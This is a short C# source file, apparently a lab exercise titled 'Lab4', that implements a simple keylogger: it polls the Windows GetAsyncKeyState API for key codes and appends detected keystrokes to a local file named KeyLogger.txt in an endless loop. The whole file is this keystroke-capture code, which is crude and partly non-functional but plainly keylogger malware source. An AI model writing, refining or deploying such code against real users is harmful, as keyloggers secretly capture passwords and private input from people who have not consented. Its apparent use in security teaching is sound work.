using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Lab4
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int64 i);

        static void Main()
        {
            
            while (true)
            {

                StreamWriter File = new StreamWriter("KeyLogger.txt", true);
                char Key = ' ';
                for (int i = 0; i < 100; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        Key = Convert.ToChar(i);
                    }
                }
                File.Write(Key);
                Console.ReadKey();
                File.Close();
            }
        }
    }
}

